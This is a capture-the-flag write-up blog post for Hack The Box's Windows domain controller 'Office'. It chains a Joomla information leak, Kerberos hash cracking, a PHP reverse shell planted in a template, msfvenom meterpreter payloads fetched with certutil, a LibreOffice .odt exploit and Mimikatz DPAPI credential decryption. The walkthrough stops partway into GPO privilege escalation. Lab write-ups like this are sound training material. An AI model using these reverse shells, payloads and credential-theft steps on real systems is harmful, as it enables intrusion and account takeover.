<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Office</title>
<meta name=description content="Platform: Hack The Box Link: Office Level: Hard OS: Windows The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-office/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Office"><meta property="og:description" content="Platform: Hack The Box Link: Office Level: Hard OS: Windows The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Office/Office.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Office/Office.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Office"><meta name=twitter:description content="Platform: Hack The Box Link: Office Level: Hard OS: Windows The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-office/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-office/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Office/Office.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-office/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-office/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Office</h1><small role=doc-subtitle></small><p class=post-date>12 min read |
<span class=post-date>June 19, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Office>Office</a></li><li>Level: Hard</li><li>OS: Windows</li></ul><hr><p>The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the web server uses an outdated version of Joomla, which is vulnerable to <code>CVE-2023-23752</code>. By exploiting this vulnerability, we leak the MySQL database password. After some enumeration, we find a valid username for the password, granting us access to a shared folder containing a pcap file.</p><p>Loading the pcap file into Wireshark, we discover an <code>AS-REQ</code> frame containing all the necessary information to construct a hash. Using hashcat, we recover a password that allows us to access the Joomla Dashboard. By inserting a PHP reverse shell into a Joomla template, we obtain our initial foothold. From this first shell, we move laterally to another user and retrieve the user flag.</p><p>Using Bloodhound, we learn that one of the users has the <code>CanPSRemote</code> permission and is also a member of the <code>GPO Managers</code> group. We achieve another lateral movement by exploiting an outdated version of LibreOffice via <code>CVE-2023-2255</code>, uploading a malicious <code>.odt</code> file to an internal website. Our final lateral movement is accomplished by decrypting some DPAPI credential files with Mimikatz, which yields the password of the user with the loose permissions. Finally, we exploit the lax configuration by adding the user to the Administrators group, allowing us to read the root flag.</p><p>Target IP address - <code>10.10.11.3</code></p><h2 id=scanning>Scanning</h2><p>A bash script is used for the scanning process, you can find it <a href=https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh>here</a>.</p><pre tabindex=0><code>./nmap_scan.sh 10.10.11.3 Office
</code></pre><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,51552,51567,51587,51639
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-06-20 00:30 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> office.htb <span style=color:#56b6c2>(</span>10.10.11.3<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.066s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          Apache httpd 2.4.56 <span style=color:#56b6c2>((</span>Win64<span style=color:#56b6c2>)</span> OpenSSL/1.1.1t PHP/8.0.28<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#d19a66>16</span> disallowed entries <span style=color:#56b6c2>(</span><span style=color:#d19a66>15</span> shown<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| /joomla/administrator/ /administrator/ /api/ /bin/ 
</span></span><span style=display:flex><span>| /cache/ /cli/ /components/ /includes/ /installation/ 
</span></span><span style=display:flex><span>|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Win64<span style=color:#56b6c2>)</span> OpenSSL/1.1.1t PHP/8.0.28
</span></span><span style=display:flex><span>|_http-generator: Joomla! - Open Source Content Management
</span></span><span style=display:flex><span>|_http-title: Home
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-06-20 13:30:27Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>443/tcp   open  ssl/http      Apache httpd 2.4.56 <span style=color:#56b6c2>(</span>OpenSSL/1.1.1t PHP/8.0.28<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: <span style=color:#d19a66>403</span> Forbidden
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Win64<span style=color:#56b6c2>)</span> OpenSSL/1.1.1t PHP/8.0.28
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>localhost
</span></span><span style=display:flex><span>| Not valid before: 2009-11-10T23:48:47
</span></span><span style=display:flex><span>|_Not valid after:  2019-11-08T23:48:47
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51552/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>51567/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51587/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51639/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-06-20T13:31:17
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m41s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 99.29 seconds
</span></span></code></pre></div><p>We are dealing with a domain controller named <code>office.htb</code>. Let&rsquo;s update the <code>/etc/hosts</code> file.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.3 office.htb dc.office.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>Visiting <code>http://office.htb/</code> we find a blog about Iron Man armors.</p><p><img src=/images/HTB-Office/office-blog.png alt="Office blog website"></p><p>Thanks to wappalyzer we find out that the website uses Joomla. We could search for vulnerabilities for that CMS but without a software version we are playing a guessing game.</p><p><img src=/images/HTB-Office/wappalyzer.png alt="Office - Wappalyzer results"></p><p>We recall that we saw a <code>robots.txt</code> file in the nmap results.</p><p><img src=/images/HTB-Office/robots-txt.png alt="Office - robots.txt"></p><p>Several directories are discovered.</p><p><img src=/images/HTB-Office/endpoints-found.png alt="robots.txt directories"></p><p><code>http://office.htb/administrator/</code> leads us to the Joomla Administrator Login page; however, we still lack the credentials.</p><p><img src=/images/HTB-Office/Joomla-admin-login.png alt="Joomla admin panel"></p><p>On <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version>this</a> HackTricks page we learn a few ways to obtain the version of Joomla and we obtain it by going to <code>http://office.htb//administrator/manifests/files/joomla.xml</code>.</p><p><img src=/images/HTB-Office/Joomla-version.png alt="Joomla version"></p><p>For this version we find <a href=https://vulncheck.com/blog/joomla-for-rce>CVE-2023-23752</a> which is an information leakage vulnerability. A PoC is available <a href=https://github.com/0xNahim/CVE-2023-23752>here</a>.</p><p>After running <code>python3 exploit.py -u http://office.htb</code> we get the MySQL root password <code>H0lOgrams4reTakIng0Ver754!</code>.</p><p><img src=/images/HTB-Office/joomla-creds.png alt="DB password recovered"></p><p>Trying to login with <code>administrator:H0lOgrams4reTakIng0Ver754!</code> fails, so we need to find another way to use this password. We know from the nmap scan results that Kerberos is running on port 88, let&rsquo;s use <a href=https://github.com/ropnop/kerbrute>kerbrute</a> to enumerate valid accounts.</p><pre tabindex=0><code>kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
</code></pre><p><img src=/images/HTB-Office/valid-users.png alt="Valid usernames found with Kerbrute"></p><p>Now with the list of valid users we can spray the password in order to get a valid username.</p><pre tabindex=0><code>kerbrute passwordspray --dc office.htb -d office.htb usernames &#39;H0lOgrams4reTakIng0Ver754!&#39;
</code></pre><p><img src=/images/HTB-Office/login-sucess.png alt="Valid credential pair"></p><p>We find that <code>dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!</code> works.</p><p>With impacket we login into smb and we notice a share called <code>SOC Analysis</code>, containing a pcap file named <code>Latest-System-Dump-8fbc124d.pcap</code> which we download.</p><pre tabindex=0><code>impacket-smbclient dwolfe:&#39;H0lOgrams4reTakIng0Ver754!&#39;@10.10.11.3
</code></pre><p><img src=/images/HTB-Office/share-access.png alt="SMB login and SOC Analysis share"></p><p>After loading the pcap file and filtering for <code>kerberos</code> we discover some valuable information.</p><p><img src=/images/HTB-Office/pcap.png alt="Kerberos pcap file"></p><blockquote><p>When a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), a process known as AS-REQ (Authentication Service Request) is used. Part of this process involves the user proving their identity to the KDC. During the AS-REQ, the client (user) sends a timestamp encrypted with their NTLM hash (which is derived from their password). This proves they know the password without sending it directly.</p></blockquote><p>We can extract the password hash from the pcap file and then use hashcat to crack it. Because hashcat has several modules for Kerberos hashes we need to use the correct format. Let&rsquo;s review the information we have:</p><ul><li>The presence of the <code>PA-DATA</code> fields, which are used for pre-authentication confirms that we are dealing with Kerberos pre-authentication packets.</li><li>The etype (encryption type) is specified as <code>18</code> and it also uses AES-256.</li><li>We have the cipher (NTLM hash) used to encrypt the timestamp.</li><li>We have the user name (<code>CNameString = tstark</code>) and the domain name (<code>realm = OFFICE.HTB</code>).</li></ul><p>With that intel we find that the corresponding hash should follow this format <code>$krb5pa$18$user$realm$cipher</code>. It corresponds to module 19900 in hashcat which you can verify <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a>.</p><p>We will use a Bash script to get the hash.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#e06c75>filter</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>tshark -r <span style=color:#e06c75>$1</span> -Y <span style=color:#98c379>&#34;kerberos.msg_type == 10 &amp;&amp; kerberos.cipher &amp;&amp; kerberos.realm &amp;&amp; kerberos.CNameString&#34;</span> -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E <span style=color:#e06c75>separator</span><span style=color:#56b6c2>=</span>$ <span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> i in <span style=color:#c678dd>$(</span><span style=color:#e5c07b>echo</span> <span style=color:#e06c75>$filter</span> | tr <span style=color:#98c379>&#39; &#39;</span> <span style=color:#98c379>&#39;\n&#39;</span><span style=color:#c678dd>)</span> ; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;\$krb5pa\$18\$</span><span style=color:#e06c75>$i</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span></code></pre></div><p><img src=/images/HTB-Office/kerberos-hash.png alt="Kerberos hash found"></p><p>Using hashcat we recover the password <code>playboy69</code>.</p><pre tabindex=0><code>hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Office/hash-cracked.png alt="Kerberos hash cracked with hashcat"></p><h2 id=initial-foothold>Initial Foothold</h2><p>With the credentials <code>administrator:playboy69</code> we log into the Joomla dashboard, we are logged in as <code>Tony Stark</code>.</p><p><img src=/images/HTB-Office/joomla-dashboard.png alt="Joomla Dashboard"></p><p>As is usual with CMS software, we can modify templates with some custom code. We exploit this to get a reverse shell. Go to <code>System</code> &ndash;> <code>Site Templates</code> &ndash;> click <code>Cassiopeia Details and Files</code> &ndash;> overwrite <code>error.php</code> with a PHP reverse shell which you can find on <a href=https://www.revshells.com/>revshells</a> &ndash;> Save and Close &ndash;> finally visit <code>http://office.htb/templates/cassiopeia/error.php</code> to trigger the reverse shell.</p><p>On the listener we get a shell as <code>web_account</code>.</p><p><img src=/images/HTB-Office/shell-office.png alt="Initial foothold, shell as web_account"></p><h3 id=shell-as-tstark>Shell as tstark</h3><p>We cannot read the user flag with this account but we can switch to the <code>tstark</code> user. Since we already have the correct credentials we can use <a href=https://github.com/antonioCoco/RunasCs>runascs</a> to access the account, we will use a meterpreter shell.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP_ADDRESS&gt; LPORT=&lt;PORT_NUMBER&gt; -f exe -o payload.exe
</code></pre><p><img src=/images/HTB-Office/msfvenom-cmd.png alt="malicious file generated with msfvenom"></p><p>After sending both files to the target we set up the handler in Metasploit.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/RunasCs.exe runascs.exe

certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/payload.exe payload.exe
</code></pre><pre tabindex=0><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost &lt;IP_ADDRESS&gt;
set lport &lt;PORT_NUMBERS&gt;
run
</code></pre><p>And running RunasCs with our malicious file we get a meterpreter shell.</p><pre tabindex=0><code>runascs.exe tstark playboy69 payload.exe
</code></pre><p><img src=/images/HTB-Office/runascs-cmd.png alt="runascs command"></p><p><img src=/images/HTB-Office/tstark-meterpreter.png alt="tstark meterpreter shell"></p><p>The user flag is found in <code>C:\Users\tstark\Desktop</code>.</p><p><img src=/images/HTB-Office/user-flag-metasploit.png alt="user flag location"></p><p>Additionally we notice two more users on the system.</p><p><img src=/images/HTB-Office/Users-list.png alt="users directory on target system"></p><h4 id=active-directory-enumeration>Active Directory Enumeration</h4><p>Knowing that we are dealing with a Domain Controller let&rsquo;s use Bloodhound to enumerate.</p><p><img src=/images/HTB-Office/bloodhound-cmd.png alt="Bloodhound command"></p><pre tabindex=0><code>bloodhound-python -c all -u tstark -p &#39;playboy69&#39; -d office.htb -dc dc.office.htb -ns 10.10.11.3
</code></pre><p>After it finishes collecting data, we can launch Bloodhound</p><pre tabindex=0><code>sudo neo4j start

bloodhound --no-sandbox
</code></pre><p>When Bloodhound launches, we use the <code>Upload Data</code> button on the right.</p><p><img src=/images/HTB-Office/upload-data-bloodhound.png alt="Upload data in Bloodhound"></p><p>Then select all the json files created by Bloodhound and the information will be imported.</p><p><img src=/images/HTB-Office/bloodhound-files.png alt="Bloodhound json files"></p><p>We discover that the <code>HHogan</code> user has the <code>CanPSRemote</code> permission allowing him to initiate remote sessions on the target. In our case <code>evil-winrm</code> can be used for that.</p><p><img src=/images/HTB-Office/hhogan-canpsremote.png alt="hhogan CanPSRemote"></p><p>Moreover this user is also a member of the <code>GPO Managers</code> group, indicating that the user has permissions to manage Group Policy Objects (GPOs).</p><p><img src=/images/HTB-Office/gpo-managers-membership.png alt="hhogan is a member of the GPO Managers group"></p><p>Running <code>netstat</code> in our meterpreter shell we notice <code>http</code> running on port <code>8083</code>, which we did not discover with nmap.</p><p><img src=/images/HTB-Office/netstat-cmd.png alt="netstat command"></p><p>To access it we will use <a href=https://github.com/nicocha30/ligolo-ng>ligolo-ng</a>.</p><p>Going to <code>http://240.0.0.1:8083/</code> we find a business website for Holography Industries.</p><p><img src=/images/HTB-Office/business-website.png alt="Internal business website"></p><p>Clicking on <code>Submit Application</code> leads us to <code>/resume.php</code>, a page where we can upload a resume for a job application.</p><p><img src=/images/HTB-Office/resume-php.png alt="resume.php page for file submission"></p><p>Trying to upload a pdf file fails, and we learn that this application only accepts <code>Doc</code>, <code>Docx</code>, <code>Docm</code>, and <code>Odt</code> files.</p><p><img src=/images/HTB-Office/files-extensions.png alt="file extensions acepted"></p><p>The files for this application are found at <code>C:\xampp\htdocs\internal</code>.</p><p><img src=/images/HTB-Office/internal-files.png alt="Internal files"></p><h3 id=shell-as-ppotts>Shell as ppotts</h3><p>The <code>resume.php</code> file is owned by the <code>PPotts</code> user.</p><p><img src=/images/HTB-Office/resume-php-permissions.png alt="resume.php file permissions"></p><p>We also find that Libre Office version 5.2 is running on the target.</p><p><img src=/images/HTB-Office/Libre-Office-version.png alt="Libre Office version"></p><p>This is an outdated version vulnerable to <a href=https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/>CVE-2023-2255</a> with a PoC available <a href=https://github.com/elweth-sec/CVE-2023-2255>here</a>.</p><p>We start by crafting a malicious exe file.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=5555 -f exe -o shell.exe
</code></pre><p>Then we use the exploit.</p><pre tabindex=0><code>python3 CVE-2023-2255.py --cmd &#39;C:\Users\Public\shell.exe&#39; --output &#39;exploit.odt&#39;
</code></pre><p><img src=/images/HTB-Office/malicious-odt.png alt="Malicious odt file"></p><p>A few minutes after placing <code>shell.exe</code> at the correct location and uploading our <code>exploit.odt</code> file via the internal application we get a new meterpreter shell as <code>ppotts</code>.</p><p><img src=/images/HTB-Office/ppotts-shell.png alt="ppotts meterpreter shell"></p><h3 id=shell-as-hhogan>Shell as hhogan</h3><p>We use <code>winpeas</code> to enumerate the target system and we find some DPAPI credentials files.</p><blockquote><p>DPAPI, which stands for Data Protection API, is a set of cryptographic services built into Windows operating systems. It provides developers with a straightforward way to protect sensitive data, such as passwords, encryption keys, and other confidential information, by encrypting and decrypting data using strong cryptographic algorithms.</p></blockquote><p><img src=/images/HTB-Office/DPAPI-Master-Keys.png alt="DPAPI master keys"></p><p><img src=/images/HTB-Office/DPAPI-Credential-Files.png alt="DPAPI credential files"></p><p>Running <code>cmdkey /list</code>, we learn that the the user <code>hhogan</code> credentials are currently stored on the target.</p><p><img src=/images/HTB-Office/cmdkey-cmd.png alt="cmdkey command"></p><p>We find the credentials files at the specified address.</p><pre tabindex=0><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
</code></pre><p><img src=/images/HTB-Office/Credential-files.png alt="Credential files location"></p><p>We also locate the master keys.</p><pre tabindex=0><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
</code></pre><p><img src=/images/HTB-Office/Master-key-files.png alt="Credential files location"></p><blockquote><p>DPAPI (Data Protection API) credential files are used by Windows to securely store sensitive information, such as user credentials, passwords, and other secrets. DPAPI provides encryption services that applications can use to protect data, ensuring that it can only be decrypted by the same user who encrypted it or by a user with the correct keys.</p></blockquote><p>We can use Mimikatz to extract passwords from credential files. To decrypt a credential file, we first need to identify which master key was used to encrypt it. Next, we must decrypt the master key, and then use this decrypted master key to decrypt the credential file.</p><p>Thanks to winpeas we know that only two out of the three master keys are used for the credential files, the ones ending with <code>47eb</code> and <code>fc7d</code>.</p><hr><h4 id=side-note>Side Note</h4><p>If we do not know which master key is used to encrypt/decrypt a credential file, we can use Mimikatz to find out.</p><pre tabindex=0><code>dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
</code></pre><p><img src=/images/HTB-Office/master-key-used.png alt="Mimikatz command to identify the correct master key used"></p><hr><p>We will start by decrypting the key that is used by two files (the one ending with <code>47eb</code>).</p><pre tabindex=0><code>dpapi::masterkey /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb&#34; /rpc
</code></pre><p><img src=/images/HTB-Office/decrypted-master-key.png alt="Mimikatz command to decrypt master key"></p><p>With the decrypted master key we decrypt the credential file and recover the password <code>H4ppyFtW183#</code>.</p><pre tabindex=0><code>dpapi::cred /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4&#34; /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</code></pre><p><img src=/images/HTB-Office/HHogan-password.png alt="hhogan password recovered"></p><p>With the newly found credentials we login via evil-winrm as <code>hhogan</code>.</p><pre tabindex=0><code>evil-winrm -u &#34;HHogan&#34; -p &#34;H4ppyFtW183#&#34; -i dc.office.htb
</code></pre><p><img src=/images/HTB-Office/HHogan-shell.png alt="hhogan shell via evil-winrm"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>We use <code>Get-GPO -All</code> to list all the GPOs of the domain. We find a few interesting ones but we need to check if this user has the permissions to interact with them. We also note their IDs.</p><p><img src=/images/HTB-Office/Default-Domain-Policy.png alt="Default domain policy"></p><p><img src=/images/HTB-Office/Default-DC-policy.png alt="Default DC domain policy"></p><p>With <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>PowerView</a> we enumerate the GPO permissions. After downloading the script we need to import the module in order to use it.</p><pre tabindex=0><code>Import-Module ./powerview.ps1
Get-NetGroup -name &#34;GPO Managers&#34;
</code></pre><p><img src=/images/HTB-Office/Powerview-GPO-Managers.png alt="PowerView used to enumerate the GPO Managers group"></p><p>The <code>GPO Managers</code> group has an SID of <code>S-1-5-21-1199398058-4196589450-691661856-1117</code>.</p><p>We specifically target the <code>Default Domain Controllers Policy</code> and enumerate its permissions using PowerView.</p><pre tabindex=0><code>Get-NetGPO | Where-Object { $_.DisplayName -eq &#34;Default Domain Controllers Policy&#34; } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
